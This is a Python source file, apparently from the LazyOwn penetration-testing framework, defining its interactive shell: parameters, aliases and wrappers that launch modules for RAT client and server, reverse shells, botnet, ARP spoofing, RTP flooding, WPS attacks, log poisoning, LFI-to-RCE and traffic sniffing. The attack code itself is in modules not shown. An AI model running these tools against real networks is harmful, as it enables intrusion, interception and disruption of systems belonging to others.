#!/usr/bin/env python3
# _*_ coding: utf8 _*_
"""
lazyown

Author: Gris Iscomeback
Email: grisiscomeback[at]gmail[dot]com
Creation Date: 13/08/2024
License: GPL v3

Description: This file contains the definition of the logic in the LazyOwnShell class

██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝

"""

from cmd import Cmd
from utils import *

class LazyOwnShell(Cmd):
    """
    A custom interactive shell for the LazyOwn Framework.

    This class extends the Cmd class to provide an interactive command-line 
    interface for the LazyOwn Framework. It supports various commands and 
    modules related to security and network operations. The shell is initialized 
    with a set of parameters and scripts, allowing users to execute predefined 
    functions and manage tasks within the framework.

    Attributes:
        prompt (str): The command prompt for the shell, obtained from the 
                      `getprompt()` function.
        intro (str): A welcome message and disclaimer displayed when the shell 
                     starts, with information about the framework and its usage.
        aliases (dict): A dictionary of command aliases for easier access to 
                        frequently used commands.
        params (dict): A dictionary of parameters with their default values, 
                       used for configuring various aspects of the framework.
        scripts (list): A list of script names included in the toolkit, representing 
                        the available modules and functionalities.
        output (str): An empty string for storing output or results from executed 
                      commands or scripts.
        custom_prompt (str): A custom prompt for the shell, obtained from the 
                             `getprompt()` function.

    Methods:
        __init__(): Initializes the shell with default parameters, script names, 
                    and an empty output string. Sets up the command prompt and 
                    custom prompt.
    """

    prompt = getprompt()

    if NOBANNER:
        intro = ""
    else:
        intro = f"""    {YELLOW}[*] Welcome to the LazyOwn Framework [;,;] {BLUE}{version} 
    {WHITE}[*] interactive s{RED}H{WHITE}ell! Type ? to list commands{BLUE}
    {RED}[!] Please do not use in military or secret service organizations, 
    {RED}[!] or for illegal purposes (this is non-binding, 
    {RED}[!] these *** ignore laws and ethics anyway){BLUE}
    {GREEN}[+] Github: {BLUE}{UNDERLINE}https://github.com/grisuno/LazyOwn{RESET}
    {GREEN}[+] Web: {BLUE}{UNDERLINE}https://grisuno.github.io/LazyOwn/{RESET}
    {GREEN}[+] Reddit: {BLUE}{UNDERLINE}https://www.reddit.com/r/LazyOwn/{RESET}
    {GREEN}[+] Facebook: {BLUE}{UNDERLINE}https://web.facebook.com/profile.php?id=61560596232150{RESET}
    {GREEN}[+] HackTheBox: {BLUE}{UNDERLINE}https://app.hackthebox.com/teams/overview/6429 {RESET}
    {GREEN}[+] Grisun0: {BLUE}{UNDERLINE}https://app.hackthebox.com/users/1998024{RESET}
    {GREEN}[+] Patreon: {BLUE}{UNDERLINE}https://patreon.com/LazyOwn {RESET}
    {GREEN}[↙] Download: {BLUE}{UNDERLINE}https://github.com/grisuno/LazyOwn/archive/refs/tags/{version}.tar.gz {RESET}
        """
    activate_virtualenv("env")

    # Diccionario para almacenar alias
    aliases = {
        "auto": "pyautomate",
        "aslr": "run lazyaslrcheck",
        "discovery": "run lazynmapdiscovery",
        "ftpsniff": "run lazyftpsniff",
        "gpt": "run lazygptcli",
        "ls": "list",
        "nmap": "run lazynmap",
        "now": "clock",
        "p": "payload",
        "poison": "run lazylogpoisoning",
        "powersploit":"sh powersploit -h",
        "pwnat": "sh pwnat -s 8080",
        "q": "exit",
        "rtpflood" : "sh sudo bash modules/lazyrtpflood.sh",
        "sniff": "run lazysniff",
        "venom": "run lazymsfvenom",
        "wps":"sh sudo bash modules/lazywps.sh",
        "ww": "whatweb",
    }

    def __init__(self):
        """
        Initializer for the LazyOwnShell class.

        This method sets up the initial parameters and scripts for an instance of
        the LazyOwnShell class. It initializes a dictionary of parameters with default
        values and a list of script names that are part of the LazyOwnShell toolkit.

        Attributes:
            params (dict): A dictionary of parameters with their default values.
            scripts (list): A list of script names included in the toolkit.
            output (str): An empty string to store output or results.
        """
        super().__init__()
        self.params = {
            "binary_name": "gzip",
            "api_key": None,
            "prompt": None,
            "url": None,
            "method": "GET",
            "headers": "{}",
            "params": "{}",
            "data": "{}",
            "json_data": "{}",
            "proxy_port": 8080,
            "wordlist": None,
            "hide_code": None,
            "mode": None,
            "reverse_shell_port": None,
            "path": "/",
            "rhost": None,
            "lhost": None,
            "rport": 1337,
            "lport": 1337,
            "rat_key": "82e672ae054aa4de6f042c888111686a",
            "startip": "192.168.1.1",
            "endip": "192.168.1.254",
            "spoof_ip": "185.199.110.153",
            "device": "eth0",
            "email_from": "email@gmail.com",
            "email_to": "email@gmail.com",
            "email_username": "email@gmail.com",
            "email_password": "pa$$w0rd",
            "smtp_server": "smtp.server.com",
            "smtp_port": "587",
            "field": "page",
            "headers_file": None,
            "data_file": None,
            "params_file": None,
            "json_data_file": None,
            "exploitdb": "/usr/share/exploitdb/exploits/",
            "dirwordlist": "/usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt",
            "usrwordlist": "/usr/share/wordlists/SecLists-master/Usernames/xato-net-10-million-usernames.txt",
            "dnswordlist": "/usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt",
        }
        self.scripts = [
            "lazysearch",
            "lazysearch_gui",
            "lazyown",
            "update_db",
            "lazynmap",
            "lazyaslrcheck",
            "lazynmapdiscovery",
            "lazygptcli",
            "lazyburpfuzzer",
            "lazymetaextract0r",
            "lazyreverse_shell",
            "lazyattack",
            "lazyownratcli",
            "lazyownrat",
            "lazygath",
            "lazysniff",
            "lazynetbios",
            "lazybotnet",
            "lazybotcli",
            "lazyhoneypot",
            "lazysearch_bot",
            "lazylfi2rce",
            "lazylogpoisoning",
            "lazymsfvenom",
            "lazypathhijacking",
            "lazyarpspoofing",
            "lazyftpsniff",
            "lazyssh77enum",
            "lazywerkzeugdebug",
        ]
        self.output = ""
        self.custom_prompt = getprompt()

    def default(self, line):
        """
        Handles undefined commands, including aliases.

        This method checks if a given command (or its alias) exists within the class
        by attempting to find a corresponding method. If the command or alias is not
        found, it prints an error message.

        :param line: The command or alias to be handled.
        :type line: str
        :return: None
        """

        # Obtener el comando o alias
        command = self.aliases.get(line, line)

        # Separar el comando y los argumentos si existe
        parts = command.split(maxsplit=1)
        cmd_name = parts[0]
        cmd_args = parts[1] if len(parts) > 1 else ""

        # Ejecutar el comando si existe
        method_name = f"do_{cmd_name}"
        if hasattr(self, method_name):
            return getattr(self, method_name)(cmd_args)
        else:
            print_error(f"{YELLOW} Not Found {BLUE}{line}{RESET}")

    def one_cmd(self, command):
        """
        Internal function to execute commands.

        This method attempts to execute a given command using `onecmd` and captures
        the output. It sets the `output` attribute based on whether the command was
        executed successfully or an exception occurred.

        :param command: The command to be executed.
        :type command: str
        :return: A message indicating the result of the command execution.
        :rtype: str
        """
        self.output = ""
        try:
            original_stdout = sys.stdout
            sys.stdout = io.StringIO()
            self.onecmd(command)
            self.output = sys.stdout.getvalue()
            sys.stdout = original_stdout
            
            return "Command executed successfully."
        except Exception as e:
            self.output = str(e)
            return "An error occurred: " + str(e)

    def emptyline(self):
        """
        Handle the case where the user enters an empty line.

        This method is called when the user submits an empty line of input in
        the command-line interface. By default, it provides feedback indicating
        that no command was entered.

        It is useful for providing user-friendly messages or handling empty input
        cases in a custom manner.

        License: This function is part of a program released under the GNU General
        Public License v3.0 (GPLv3). You can redistribute it and/or modify it
        under the terms of the GPLv3, as published by the Free Software Foundation.

        Note: This method is called by the cmd library when an empty line is
        entered. You can override it in a subclass to change its behavior.

        Example:
            >>> shell = LazyOwnShell()
            >>> shell.emptyline()
            You didn't enter any command.
        """        
        print_warn("You didn't enter any command.")

    def do_EOF(self, line):
        """
        Handle the end-of-file (EOF) condition.

        This method is called when the user sends an end-of-file (EOF) signal
        by pressing Ctrl+D. It is typically used to handle cleanup or exit
        operations when the user terminates input.

        In this implementation, it prints a farewell message and returns True
        to indicate that the shell should exit.

        License: This function is part of a program released under the GNU General
        Public License v3.0 (GPLv3). You can redistribute it and/or modify it
        under the terms of the GPLv3, as published by the Free Software Foundation.

        Note: This method is a part of the `cmd` library's command handling
        system. You can override it in a subclass to customize its behavior.

        Example:
            >>> shell = LazyOwnShell()
            >>> shell.do_EOF(None)
            LazyOwn say Goodbye!
            (shell exits)
        """
        print_warn("LazyOwn say Goodbye!")
        return True
    
    def postloop(self):
        """
        Handle operations to perform after exiting the command loop.

        This method is called after the command loop terminates, typically used
        for performing any final cleanup or displaying messages before the program
        exits.

        In this implementation, it prints a message indicating that the custom
        shell is exiting.

        License: This function is part of a program released under the GNU General
        Public License v3.0 (GPLv3). You can redistribute it and/or modify it
        under the terms of the GPLv3, as published by the Free Software Foundation.

        Note: This method is called automatically by the `cmd` library's command
        loop after the loop terminates. You can override it in a subclass to
        customize its behavior.

        Example:
            >>> shell = LazyOwnShell()
            >>> shell.cmdloop()  # Exits the command loop
            Exiting custom LazyOwnShell.
        """        
        print_warn("Exiting custom LazyOwnShell.")

    def do_set(self, line):
        """
        Set a parameter value.

        This function takes a line of input, splits it into a parameter and a value,
        and sets the specified parameter to the given value if the parameter exists.

        :param line: A string containing the parameter and value to be set.
                    Expected format: '<parameter> <value>'.
        :type line: str
        :return: None
        :raises: ValueError if the input line does not contain exactly two elements.
        """
        args = shlex.split(line)
        if len(args) != 2:
            print_error(f"{YELLOW} Usage: set <parameter> <value>{RESET}")
            return

        param, value = args
        if param in self.params:
            self.params[param] = value
            print_msg(f"{YELLOW}{param} set to {GREEN}{value} {RESET}")
        else:
            print_error(f"Unknown parameter: {param}{RESET}")
        return

    def do_show(self, line):
        """
        Show the current parameter values.

        This function iterates through the current parameters and their values,
        printing each parameter and its associated value.

        :param line: This parameter is not used in the function.
        :type line: str
        :return: None
        """
        for param, value in self.params.items():
            print_msg(f"{param}: {value}")

    def do_list(self, line):
        """
        Lists all available scripts in the modules directory.

        This method prints a list of available scripts in a formatted manner, arranging
        them into columns. It shows each script with sufficient spacing for readability.

        :param line: This parameter is not used in the method.
        :type line: str
        :return: None
        """

        scripts = self.scripts
        num_columns = 3

        if not scripts:
            print_error(f"No available scripts.{RESET}")
            return

        max_len = max(len(script) for script in scripts)
        column_width = max_len + 2 

        rows = [
            scripts[i : i + num_columns] for i in range(0, len(scripts), num_columns)
        ]

        print_msg(f"Available scripts to run:{RESET}")
        for row in rows:
            print_msg(
                f"   ".join(
                    f"{script.ljust(column_width)}{RESET}    " for script in row
                )
            )

    def do_run(self, line):
        """
        Runs a specific LazyOwn script.

        This method executes a script from the LazyOwn toolkit based on the provided
        script name. If the script is not recognized, it prints an error message.
        To see available scripts, use the `list` or `help list` commands.

        :param line: The command line input containing the script name.
        :type line: str
        :return: None
        """

        args = shlex.split(line)
        if not args:
            print_error(f"Usage: {GREEN} run <script_name> {RESET}")
            return

        script_name = args[0]
        if script_name in self.scripts:
            getattr(self, f"run_{script_name}")()
        else:
            print_error(f"Unknown script: {CYAN}{script_name}{RESET}")

    def run_lazysearch(self):
        """
        Runs the internal module `modules/lazysearch.py`.

        This method executes the `lazysearch` script from the specified path, using
        the `binary_name` parameter from the `self.params` dictionary. If `binary_name`
        is not set, it prints an error message.

        :return: None
        """
        binary_name = self.params["binary_name"]
        if not binary_name:
            print_error("binary_name not set")
            return
        self.run_script("modules/lazysearch.py", binary_name)

    def run_lazysearch_gui(self):
        """
        Run the internal module located at `modules/LazyOwnExplorer.py`.

        This method executes the `LazyOwnExplorer.py` script, which is used for graphical user interface (GUI) functionality within the LazyOwn framework.

        The function performs the following steps:

        1. Calls `self.run_script` with `LazyOwnExplorer.py` to execute the GUI module.

        :returns: None

        Manual execution:
        1. Ensure that the `modules/LazyOwnExplorer.py` script is present in the `modules` directory.
        2. Run the script with:
            `python3 modules/LazyOwnExplorer.py`

        Example:
            To run `LazyOwnExplorer.py` directly, execute:
            `python3 modules/LazyOwnExplorer.py`

        Note:
            - Ensure that the script has the appropriate permissions and dependencies to run.
            - Verify that your environment supports GUI operations if using this script in a non-graphical environment.
        """

        self.run_script("modules/LazyOwnExplorer.py")
        return

    def run_lazyown(self):
        """
        Run the internal module located at `modules/lazyown.py`.

        This method executes the `lazyown.py` script, which is a core component of the LazyOwn framework.

        The function performs the following steps:

        1. Calls `self.run_script` with `lazyown.py` to execute the script.

        :returns: None

        Manual execution:
        1. Ensure that the `modules/lazyown.py` script is present in the `modules` directory.
        2. Run the script with:
            `python3 modules/lazyown.py`

        Example:
            To run `lazyown.py` directly, execute:
            `python3 modules/lazyown.py`

        Note:
            - Ensure that the script has the appropriate permissions and dependencies to run.
        """

        self.run_script("modules/lazyown.py")
        return

    def run_update_db(self):
        """
        Run the internal module located at `modules/update_db.sh`.

        This method executes the `update_db.sh` script to update the database of binary exploitables from `gtofbins`.

        The function performs the following steps:

        1. Executes the `update_db.sh` script located in the `modules` directory using `os.system`.

        :returns: None

        Manual execution:
        1. Ensure that the `modules/update_db.sh` script is present in the `modules` directory.
        2. Run the script with:
            `./modules/update_db.sh`

        Example:
            To manually update the database, execute:
            `./modules/update_db.sh`

        Note:
            - Ensure that the script has execute permissions.
            - The script should be run with the necessary privileges if required.
        """

        os.system("./modules/update_db.sh")
        return

    def run_lazynmap(self):
        """
        Runs the internal module `modules/lazynmap.sh` for multiple Nmap scans.

        This method executes the `lazynmap` script, using the current working directory
        and the `rhost` parameter from the `self.params` dictionary as the target IP.
        If `rhost` is not set, it prints an error message.

        :return: None
        """

        path = os.getcwd()
        target_ip = self.params["rhost"]
        if not target_ip:
            print_error(f"rhost must be set, {GREEN}help set to more info {RESET}")
            return
        os.system(f"{path}/modules/lazynmap.sh -t {target_ip}")
        return

    def run_lazywerkzeugdebug(self):
        """
        Run the internal module located at `modules/lazywerkzeug.py` in debug mode.

        This method executes the `lazywerkzeug.py` script with the specified parameters for remote and local hosts and ports. It is used to test Werkzeug in debug mode.

        The function performs the following steps:

        1. Retrieves the `rhost`, `lhost`, `rport`, and `lport` values from `self.params`.
        2. Checks if all required parameters are set. If not, prints an error message and returns.
        3. Calls `self.run_script` with `lazywerkzeug.py` and the specified parameters.

        :param rhost: The remote host address.
        :type rhost: str

        :param lhost: The local host address.
        :type lhost: str

        :param rport: The remote port number.
        :type rport: int

        :param lport: The local port number.
        :type lport: int

        :returns: None

        Manual execution:
        1. Ensure that `rhost`, `lhost`, `rport`, and `lport` are set in `self.params`.
        2. The script `modules/lazywerkzeug.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazywerkzeug.py <rhost> <rport> <lhost> <lport>`

        Example:
            To run `lazywerkzeug.py` with `rhost` set to `"127.0.0.1"`, `rport` to `5000`, `lhost` to `"localhost"`, and `lport` to `8000`, set:
            `self.params["rhost"] = "127.0.0.1"`
            `self.params["rport"] = 5000`
            `self.params["lhost"] = "localhost"`
            `self.params["lport"] = 8000`
            Then call:
            `run_lazywerkzeugdebug()`

        Note:
            - Ensure that `modules/lazywerkzeug.py` has the appropriate permissions and dependencies to run.
            - Verify that the specified hosts and ports are correct and available.
        """

        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        rport = self.params["rport"]
        lport = self.params["lport"]
        if not rhost or not lhost or not lport or not rport:
            print_error(
                "rhost, lhost, rpor, and lport must be set, to more info see: help set"
            )
            return
        self.run_script("modules/lazywerkzeug.py", rhost, rport, lhost, lport)
        return

    def run_lazygath(self):
        """
        Run the internal module located at `modules/lazygat.sh`. to gathering the sistem :)

        This method executes the `lazygat.sh` script located in the `modules` directory with `sudo` privileges.

        The function performs the following steps:

        1. Retrieves the current working directory.
        2. Executes the `lazygat.sh` script using `sudo` to ensure it runs with elevated permissions.

        :returns: None

        Manual execution:
        1. Ensure that the `modules/lazygat.sh` script is present in the `modules` directory.
        2. Run the script with:
            `sudo ./modules/lazygat.sh`

        Example:
            To manually run the script with elevated privileges, execute:
            `sudo ./modules/lazygat.sh`

        Note:
            - Ensure that the script has execute permissions.
            - The script should be run with `sudo` if it requires elevated privileges.
        """

        path = os.getcwd()
        os.system(f"sudo {path}/modules/lazygat.sh")
        return

    def run_lazynmapdiscovery(self):
        """
        Runs the internal module `modules/lazynmap.sh` with discovery mode.

        This method executes the `lazynmap` script in discovery mode. It uses the current
        working directory for locating the script.

        :return: None
        """

        path = os.getcwd()
        os.system(f"{path}/modules/lazynmap.sh -d")
        return

    def run_lazysniff(self):
        """
        Run the sniffer internal module located at `modules/lazysniff.py` with the specified parameters.

        This method executes the script with the following arguments:

        - `device`: The network interface to be used for sniffing, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the `device` value from `self.params`.
        2. Sets up the environment variables `LANG` and `TERM` to ensure proper script execution.
        3. Uses `subprocess.run` to execute the `lazysniff.py` script with the `-i` option to specify the network interface.

        :param device: The network interface to be used for sniffing.
        :type device: str

        :returns: None

        Manual execution:
        1. Ensure that `device` is set in `self.params`.
        2. The script `modules/lazysniff.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazysniff.py -i <device>`

        Example:
            To run `lazysniff` with `device` set to `"eth0"`, set:
            `self.params["device"] = "eth0"`
            Then call:
            `run_lazysniff()`

        Note:
            - Ensure that `modules/lazysniff.py` has the appropriate permissions and dependencies to run.
            - Ensure that the network interface specified is valid and properly configured.
        """


        env = os.environ.copy()
        env["LANG"] = "en_US.UTF-8"
        env["TERM"] = "xterm-256color"
        device = self.params["device"]
        subprocess.run(
            ["python3", "modules/lazysniff.py", "-i", device],
            env=env,
            stdin=sys.stdin,
            stdout=sys.stdout,
            stderr=sys.stderr,
        )

    def run_lazyftpsniff(self):
        """
        Run the sniffer ftp internal module located at `modules/lazyftpsniff.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `device`: The network interface to be used for sniffing, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the `device` value from `self.params`.
        2. Sets up the environment variables `LANG` and `TERM` to ensure proper script execution.
        3. Uses `subprocess.run` to execute the `lazyftpsniff.py` script with the `-i` option to specify the network interface.

        :param device: The network interface to be used for sniffing.
        :type device: str

        :returns: None

        Manual execution:
        1. Ensure that `device` is set in `self.params`.
        2. The script `modules/lazyftpsniff.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazyftpsniff.py -i <device>`

        Example:
            To run `lazyftpsniff` with `device` set to `"eth0"`, set:
            `self.params["device"] = "eth0"`
            Then call:
            `run_lazyftpsniff()`

        Note:
            - Ensure that `modules/lazyftpsniff.py` has the appropriate permissions and dependencies to run.
            - Ensure that the network interface specified is valid and properly configured.
        """

        device = self.params["device"]
        env = os.environ.copy()
        env["LANG"] = "en_US.UTF-8"
        env["TERM"] = "xterm-256color"
        if not device:
            print_error("device must be set to choice the interface")
            return
        subprocess.run(["python3", "modules/lazyftpsniff.py", "-i", device])

    def run_lazynetbios(self):
        """
        Run the internal module to search netbios vuln victims, located at `modules/lazynetbios.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `startip`: The starting IP address for the NetBIOS scan, specified in `self.params`.
        - `endip`: The ending IP address for the NetBIOS scan, specified in `self.params`.
        - `spoof_ip`: The IP address to be used for spoofing, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the `startip`, `endip`, and `spoof_ip` values from `self.params`.
        2. Uses `subprocess.run` to execute the `lazynetbios.py` script with the specified parameters.

        :param startip: The starting IP address for the NetBIOS scan.
        :type startip: str

        :param endip: The ending IP address for the NetBIOS scan.
        :type endip: str

        :param spoof_ip: The IP address to be used for spoofing.
        :type spoof_ip: str

        :returns: None

        Manual execution:
        1. Ensure that `startip`, `endip`, and `spoof_ip` are set in `self.params`.
        2. The script `modules/lazynetbios.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazynetbios.py <startip> <endip> <spoof_ip>`

        Example:
            To run `lazynetbios` with `startip` set to `"192.168.1.1"`, `endip` set to `"192.168.1.10"`, and `spoof_ip` set to `"192.168.1.100"`, set:
            `self.params["startip"] = "192.168.1.1"`
            `self.params["endip"] = "192.168.1.10"`
            `self.params["spoof_ip"] = "192.168.1.100"`
            Then call:
            `run_lazynetbios()`

        Note:
            - Ensure that `modules/lazynetbios.py` has the appropriate permissions and dependencies to run.
            - Ensure that the IP addresses are correctly set and valid for the NetBIOS scan.
        """

        startip = self.params["startip"]
        endip = self.params["endip"]
        spoof_ip = self.params["spoof_ip"]
        subprocess.run(["python3", "modules/lazynetbios.py", startip, endip, spoof_ip])

    def run_lazyhoneypot(self):
        """
        Run the internal module located at `modules/lazyhoneypot.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `email_from`: The email address from which messages will be sent, specified in `self.params`.
        - `email_to`: The recipient email address, specified in `self.params`.
        - `email_username`: The username for email authentication, specified in `self.params`.
        - `email_password`: The password for email authentication, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the `email_from`, `email_to`, `email_username`, and `email_password` values from `self.params`.
        2. Calls the `run_script` method to execute the `lazyhoneypot.py` script with the provided email parameters.

        :param email_from: The email address from which messages will be sent.
        :type email_from: str

        :param email_to: The recipient email address.
        :type email_to: str

        :param email_username: The username for email authentication.
        :type email_username: str

        :param email_password: The password for email authentication.
        :type email_password: str

        :returns: None

        Manual execution:
        1. Ensure that `email_from`, `email_to`, `email_username`, and `email_password` are set in `self.params`.
        2. The script `modules/lazyhoneypot.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazyhoneypot.py --email_from <email_from> --email_to <email_to> --email_username <email_username> --email_password <email_password>`

        Example:
            To run `lazyhoneypot` with `email_from` set to `"sender@example.com"`, `email_to` set to `"recipient@example.com"`, `email_username` set to `"user"`, and `email_password` set to `"pass"`, set:
            `self.params["email_from"] = "sender@example.com"`
            `self.params["email_to"] = "recipient@example.com"`
            `self.params["email_username"] = "user"`
            `self.params["email_password"] = "pass"`
            Then call:
            `run_lazyhoneypot()`

        Note:
            - Ensure that `modules/lazyhoneypot.py` has the appropriate permissions and dependencies to run.
            - Ensure that the email credentials are correctly set for successful authentication and operation.
        """

        email_from = self.params["email_from"]
        email_to = self.params["email_to"]
        email_username = self.params["email_username"]
        email_password = self.params["email_password"]
        self.run_script(
            "modules/lazyhoneypot.py",
            "--email_from",
            email_from,
            "--email_to",
            email_to,
            "--email_username",
            email_username,
            "--email_password",
            email_password,
        )

    def run_lazygptcli(self):
        """
        Run the internal module to create Oneliners with Groq AI located at `modules/lazygptcli.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `prompt`: The prompt to be used by the script, specified in `self.params`.
        - `api_key`: The API key to be set in the environment variable `GROQ_API_KEY`, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the `prompt` and `api_key` values from `self.params`.
        2. Checks if both `prompt` and `api_key` are set. If either is missing, it prints an error message and returns.
        3. Sets the environment variable `GROQ_API_KEY` with the provided `api_key`.
        4. Calls the `run_script` method to execute the `lazygptcli.py` script with the `--prompt` argument.

        :param prompt: The prompt to be used by the script.
        :type prompt: str

        :param api_key: The API key for accessing the service.
        :type api_key: str

        :returns: None

        Manual execution:
        1. Ensure that `prompt` and `api_key` are set in `self.params`.
        2. The script `modules/lazygptcli.py` should be present in the `modules` directory.
        3. Set the environment variable `GROQ_API_KEY` with the API key value.
        4. Run the script with:
            `python3 modules/lazygptcli.py --prompt <prompt>`

        Example:
            To run `lazygptcli` with `prompt` set to `"Your prompt"` and `api_key` set to `"your_api_key"`, set:
            `self.params["prompt"] = "Your prompt"`
            `self.params["api_key"] = "your_api_key"`
            Then call:
            `run_lazygptcli()`

        Note:
            - Ensure that `modules/lazygptcli.py` has the appropriate permissions and dependencies to run.
            - The environment variable `GROQ_API_KEY` must be correctly set for the script to function.
        """

        prompt = self.params["prompt"]
        api_key = self.params["api_key"]
        if not prompt or not api_key:
            print_error("Prompt and api_key must be set")
            return
        os.environ["GROQ_API_KEY"] = api_key
        self.run_script("modules/lazygptcli.py", "--prompt", prompt)

    def run_lazysearch_bot(self):
        """
        Run the internal module GROQ AI located at `modules/lazysearch_bot.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `prompt`: The prompt to be used by the script, specified in `self.params`.
        - `api_key`: The API key to be set in the environment variable `GROQ_API_KEY`, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the `prompt` and `api_key` values from `self.params`.
        2. Checks if both `prompt` and `api_key` are set. If either is missing, it prints an error message and returns.
        3. Sets the environment variable `GROQ_API_KEY` with the provided `api_key`.
        4. Calls the `run_script` method to execute the `lazysearch_bot.py` script with the `--prompt` argument.

        :param prompt: The prompt to be used by the script.
        :type prompt: str

        :param api_key: The API key for accessing the service.
        :type api_key: str

        :returns: None

        Manual execution:
        1. Ensure that `prompt` and `api_key` are set in `self.params`.
        2. The script `modules/lazysearch_bot.py` should be present in the `modules` directory.
        3. Set the environment variable `GROQ_API_KEY` with the API key value.
        4. Run the script with:
            `python3 modules/lazysearch_bot.py --prompt <prompt>`

        Example:
            To run `lazysearch_bot` with `prompt` set to `"Search query"` and `api_key` set to `"your_api_key"`, set:
            `self.params["prompt"] = "Search query"`
            `self.params["api_key"] = "your_api_key"`
            Then call:
            `run_lazysearch_bot()`

        Note:
            - Ensure that `modules/lazysearch_bot.py` has the appropriate permissions and dependencies to run.
            - The environment variable `GROQ_API_KEY` must be correctly set for the script to function.
        """

        prompt = self.params["prompt"]
        api_key = self.params["api_key"]
        if not prompt or not api_key:
            print_error("Prompt and api_key must be set")
            return
        os.environ["GROQ_API_KEY"] = api_key
        self.run_script("modules/lazysearch_bot.py", "--prompt", prompt)

    def run_lazymetaextract0r(self):
        """
        Run the Metadata extractor internal module located at `modules/lazyown_metaextract0r.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `path`: The file path to be processed by the script, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the value for `path` from `self.params`.
        2. Checks if the `path` parameter is set. If not, it prints an error message and returns.
        3. Calls the `run_script` method to execute the `lazyown_metaextract0r.py` script with the appropriate argument.

        :param path: The file path to be processed by the script.
        :type path: str

        :returns: None

        Manual execution:
        1. Ensure that `path` is set in `self.params`.
        2. The script `modules/lazyown_metaextract0r.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazyown_metaextract0r.py --path <path>`

        Example:
            To run `lazyown_metaextract0r` with `path` set to `/home/user/file.txt`, set:
            `self.params["path"] = "/home/user/file.txt"`
            Then call:
            `run_lazymetaextract0r()`

        Note:
            - Ensure that `modules/lazyown_metaextract0r.py` has the appropriate permissions and dependencies to run.
        """

        path = self.params["path"]
        if not path:
            print_error("Path must be set")
            return
        self.run_script("modules/lazyown_metaextract0r.py", "--path", path)

    def run_lazyownratcli(self):
        """
        Run the internal module located at `modules/lazyownclient.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `lhost`: The IP address of the local host, specified in `self.params`.
        - `lport`: The port number of the local host, specified in `self.params`.
        - `rat_key`: The RAT key, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the values for `lhost`, `lport`, and `rat_key` from `self.params`.
        2. Checks if all required parameters (`lhost`, `lport`, and `rat_key`) are set. If any are missing, it prints an error message and returns.
        3. Calls the `run_script` method to execute the `lazyownclient.py` script with the appropriate arguments.

        :param lhost: The IP address of the local host.
        :type lhost: str
        :param lport: The port number of the local host.
        :type lport: int
        :param rat_key: The RAT key.
        :type rat_key: str

        :returns: None

        Manual execution:
        1. Ensure that `lhost`, `lport`, and `rat_key` are set in `self.params`.
        2. The script `modules/lazyownclient.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazyownclient.py --host <lhost> --port <lport> --key <rat_key>`

        Example:
            To run `lazyownclient` with `lhost` set to `192.168.1.10`, `lport` set to `8080`, and `rat_key` set to `my_secret_key`, set:
            `self.params["lhost"] = "192.168.1.10"`
            `self.params["lport"] = 8080`
            `self.params["rat_key"] = "my_secret_key"`
            Then call:
            `run_lazyownratcli()`

        Note:
            - Ensure that `modules/lazyownclient.py` has the appropriate permissions and dependencies to run.
        """

        lhost = self.params["lhost"]
        lport = self.params["lport"]
        rat_key = self.params["rat_key"]
        if not lhost or not lport or not rat_key:
            print_error("lhost and lport and rat_key must be set")
            return
        self.run_script(
            "modules/lazyownclient.py",
            "--host",
            lhost,
            "--port",
            str(lport),
            "--key",
            rat_key,
        )

    def run_lazyownrat(self):
        """
        Run the internal module located at `modules/lazyownserver.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `rhost`: The IP address of the remote host, specified in `self.params`.
        - `rport`: The port number of the remote host, specified in `self.params`.
        - `rat_key`: The RAT key, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the values for `rhost`, `rport`, and `rat_key` from `self.params`.
        2. Checks if all required parameters (`rhost`, `rport`, and `rat_key`) are set. If any are missing, it prints an error message and returns.
        3. Calls the `run_script` method to execute the `lazyownserver.py` script with the appropriate arguments.

        :param rhost: The IP address of the remote host.
        :type rhost: str
        :param rport: The port number of the remote host.
        :type rport: int
        :param rat_key: The RAT key.
        :type rat_key: str

        :returns: None

        Manual execution:
        1. Ensure that `rhost`, `rport`, and `rat_key` are set in `self.params`.
        2. The script `modules/lazyownserver.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazyownserver.py --host <rhost> --port <rport> --key <rat_key>`

        Example:
            To run `lazyownserver` with `rhost` set to `192.168.1.10`, `rport` set to `8080`, and `rat_key` set to `my_secret_key`, set:
            `self.params["rhost"] = "192.168.1.10"`
            `self.params["rport"] = 8080`
            `self.params["rat_key"] = "my_secret_key"`
            Then call:
            `run_lazyownrat()`

        Note:
            - Ensure that `modules/lazyownserver.py` has the appropriate permissions and dependencies to run.
        """

